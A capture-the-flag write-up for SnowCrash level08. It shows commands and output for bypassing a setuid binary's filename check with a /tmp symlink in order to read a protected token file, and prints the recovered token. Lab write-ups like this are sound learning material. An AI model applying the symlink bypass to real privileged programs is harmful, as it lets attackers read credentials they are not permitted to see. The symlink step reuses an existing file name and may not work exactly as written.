In our home directory, we notice an executable with extended permissions and a token file that we do not have access to:

```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

When we test the executable with a file we own, it displays the file's content:

```
level08@SnowCrash:~$ echo '42' > /tmp/test
level08@SnowCrash:~$./level08 /tmp/test
42
```

But that doesn't work with the token file:

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Since we don't receive a Linux permission error, it's possible that the level08 executable restricts access based on the file name. To bypass this, we can try using a symlink:

```
level08@SnowCrash:~$ ln -s ~/token /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
25749xKZ8L7DkSCwJkT9dyv6f
```
